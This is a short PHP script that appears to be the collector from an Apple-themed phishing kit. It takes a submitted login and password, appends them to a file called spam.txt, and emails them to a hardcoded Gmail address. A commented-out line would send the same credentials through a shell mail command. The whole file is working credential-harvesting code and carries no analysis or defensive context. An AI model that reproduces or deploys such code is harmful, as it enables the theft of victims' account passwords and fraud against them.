 <?php
$id=$_REQUEST['id'];
$pass=$_REQUEST['pass'];

$monfichier = fopen('spam.txt','a+');
fputs($monfichier, $id.'--'.$pass."\r\n"); 
fclose($monfichier);



$mail="bouha51@gmail.com";
mail($mail,"APPLE","login et password apple :: LOGIN : ".$id."  ||  PASSWORD : ".$pass);
 //$m='(echo "login  : '.$id.' || password :'.$pass.'" |mail -s "login et password apple" '.$mail.')';
 // shell_exec($m);
 
 ?>